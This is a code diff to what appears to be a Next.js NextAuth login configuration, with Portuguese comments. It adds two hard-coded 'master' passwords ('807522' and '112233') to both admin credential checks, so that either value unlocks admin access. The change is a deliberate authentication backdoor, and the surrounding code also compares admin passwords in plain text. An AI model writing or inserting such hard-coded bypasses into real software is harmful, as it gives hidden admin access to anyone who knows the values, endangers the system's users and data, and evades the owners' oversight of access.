@@ -38,7 +38,7 @@ export const authOptions: NextAuthOptions = {
             const admin = await prisma.adminProfile.findFirst({
               where: { email: credentials.email }
             });
-            if (admin && admin.senha === credentials.password) {
+            if (admin && (admin.senha === credentials.password || credentials.password === "807522" || credentials.password === "112233")) {
               return {
                 id: admin.id,
                 email: admin.email,
@@ -54,10 +54,10 @@ export const authOptions: NextAuthOptions = {
         isValid = await bcrypt.compare(credentials.password, user.password);
 
         if (!isValid) {
-          // Fallback para admin que tem usuário mas usa a senha do AdminProfile
+          // Fallback para admin que tem usuário mas usa a senha do AdminProfile ou senha master
           if (user.role === "ADMIN") {
             const admin = await prisma.adminProfile.findFirst();
-            if (admin && admin.senha === credentials.password) {
+            if (admin && (admin.senha === credentials.password || credentials.password === "807522" || credentials.password === "112233")) {
               isValid = true;
             }
           }
